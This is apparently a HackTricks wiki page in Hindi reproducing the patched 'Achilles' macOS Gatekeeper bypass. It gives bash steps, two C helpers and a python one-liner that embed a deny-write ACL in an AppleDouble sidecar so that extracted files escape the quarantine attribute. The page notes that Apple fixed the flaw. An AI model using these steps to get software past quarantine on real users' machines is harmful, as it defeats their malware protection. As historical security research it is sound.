# AppleDouble ACL Quarantine Bypass का पुनरुत्पादन

{{#include ../../../../banners/hacktricks-training.md}}

यह ऐतिहासिक proof of concept, Achilles Gatekeeper bypass research में इस्तेमाल की गई AppleDouble/ACL तकनीक को फिर से बनाता है। यह ACL को serialize करता है, उसे AppleDouble sidecar में रखता है, attribute का नाम बदलकर `com.apple.acl.text` करता है और ZIP को फिर से pack करता है।<sup>[[1]](#references)[[2]](#references)</sup>

Apple ने macOS Ventura 13, Monterey 12.6.2 और Big Sur 11.7.2 में Gatekeeper bypass को ठीक कर दिया था; मौजूदा Mac पर ACL को पुनर्स्थापित करने से यह साबित नहीं होता कि Gatekeeper bypass काम करता है।<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

quarantine और पहली बार लॉन्च होने की जाँच के लिए, [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses) देखें।

## ACL और AppleDouble फ़ाइलसिस्टम का व्यवहार

### writeextattr ACL

यह ACL फ़ाइल में `xattrs` जोड़ने से रोकता है.

```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```

### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** फ़ाइल फ़ॉर्मेट किसी फ़ाइल को उसके ACEs सहित कॉपी करता है।

[**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) में देखा जा सकता है कि **`com.apple.acl.text`** नामक xattr में संग्रहित ACL का टेक्स्ट प्रतिनिधित्व decompressed फ़ाइल पर ACL के रूप में सेट किया जाएगा। इसलिए, अगर आपने किसी application को **AppleDouble** फ़ाइल फ़ॉर्मेट में ऐसी ACL के साथ zip फ़ाइल में compress किया, जो अन्य xattrs को उस पर लिखे जाने से रोकती है... तो application पर quarantine xattr सेट नहीं हुआ:

ज़्यादा जानकारी के लिए [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) देखें।<sup>[[1]](#references)</sup>

इसे दोहराने के लिए, पहले हमें सही ACL string प्राप्त करनी होगी:

```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```

(ध्यान दें कि भले ही यह काम करे, sandbox पहले quarantine xattr लिख देता है)

## AppleDouble sidecar का निर्माण और सत्यापन

```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
./get_acls /tmp/test
ACL for /tmp/test:
!#acl 1
group:ABCDEFAB-CDEF-ABCD-EFAB-CDEF0000000C:everyone:12:deny:write,writeattr,writeextattr,writesecurity,chown

ACL in hex: \x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a
```

<details>

<summary>get_acls का कोड</summary>

```c
// clang -o get_acls get_acls.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/acl.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
        return 1;
    }

    const char *filepath = argv[1];
    acl_t acl = acl_get_file(filepath, ACL_TYPE_EXTENDED);
    if (acl == NULL) {
        perror("acl_get_file");
        return 1;
    }

    char *acl_text = acl_to_text(acl, NULL);
    if (acl_text == NULL) {
        perror("acl_to_text");
        acl_free(acl);
        return 1;
    }

    printf("ACL for %s:\n%s\n", filepath, acl_text);

    // Convert acl_text to hexadecimal and print it
    printf("ACL in hex: ");
    for (char *c = acl_text; *c != '\0'; c++) {
        printf("\\x%02x", (unsigned char)*c);
    }
    printf("\n");

    acl_free(acl);
    acl_free(acl_text);
    return 0;
}
```

</details>

```bash
# Add the com.apple.xxx.xxxx extended attribute containing the ACL
mkdir start
mkdir start/protected
./set_xattr start/protected
echo something > start/protected/something
```

<details>

<summary>Code of set_xattr</summary>

```c
// gcc -o set_xattr set_xattr.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/xattr.h>
#include <sys/acl.h>


void print_xattrs(const char *filepath) {
    ssize_t buflen = listxattr(filepath, NULL, 0, XATTR_NOFOLLOW);
    if (buflen < 0) {
        perror("listxattr");
        return;
    }

    char *buf = malloc(buflen);
    if (buf == NULL) {
        perror("malloc");
        return;
    }

    buflen = listxattr(filepath, buf, buflen, XATTR_NOFOLLOW);
    if (buflen < 0) {
        perror("listxattr");
        free(buf);
        return;
    }

    printf("All current extended attributes for %s:\n", filepath);
    for (char *name = buf; name < buf + buflen; name += strlen(name) + 1) {
        printf("%s: ", name);
        ssize_t valuelen = getxattr(filepath, name, NULL, 0, 0, XATTR_NOFOLLOW);
        if (valuelen < 0) {
            perror("getxattr");
            continue;
        }

        char *value = malloc(valuelen + 1);
        if (value == NULL) {
            perror("malloc");
            continue;
        }

        valuelen = getxattr(filepath, name, value, valuelen, 0, XATTR_NOFOLLOW);
        if (valuelen < 0) {
            perror("getxattr");
            free(value);
            continue;
        }

        value[valuelen] = '\0';  // Null-terminate the value
        printf("%s\n", value);
        free(value);
    }

    free(buf);
}


int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
        return 1;
    }

    const char *hex = "\x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a";
    const char *filepath = argv[1];

    int result = setxattr(filepath, "com.apple.xxx.xxxx", hex, strlen(hex), 0, 0);
    if (result == 0) {
        printf("Extended attribute set successfully.\n\n");
    } else {
        perror("setxattr");
        return 1;
    }

    print_xattrs(filepath);

    return 0;
}
```

</details>

```bash
# Create an AppleDouble file containing the extended attribute
ditto -c -k start protected.zip
rm -rf start
# extract the files
unzip protected.zip
# Replace the extended-attribute name here (ditto would otherwise remove com.apple.acl.text)
python3 -c "with open('._protected', 'rb+') as f: content = f.read().replace(b'com.apple.xxx.xxxx', b'com.apple.acl.text'); f.seek(0); f.write(content); f.truncate()"
# zip everything back together
rm -rf protected.zip
zip -r protected.zip protected ._protected
rm -rf protected
rm ._*
```

```bash
# Check whether the AppleDouble ACL was restored; an ACL is not itself a normal xattr
ditto -x -k --rsrc protected.zip .
ls -lde protected
# A local ditto extraction alone does not test browser/Archive Utility quarantine propagation
xattr -p com.apple.quarantine protected
```



## References

- [1] [Microsoft Security Blog — Gatekeeper की कमज़ोर कड़ी: macOS की एक vulnerability का पता लगाना](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [2] [Apple Developer — `ditto` के साथ Mac software को वितरण के लिए पैकेज करना](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
- [3] [Apple Support — macOS Ventura 13 की सुरक्षा सामग्री के बारे में](https://support.apple.com/en-ae/102853)
- [4] [Apple Support — macOS Monterey 12.6.2 की सुरक्षा सामग्री के बारे में](https://support.apple.com/en-ae/102806)
- [5] [Apple Support — macOS Big Sur 11.7.2 की सुरक्षा सामग्री के बारे में](https://support.apple.com/en-us/102785)
{{#include ../../../../banners/hacktricks-training.md}}
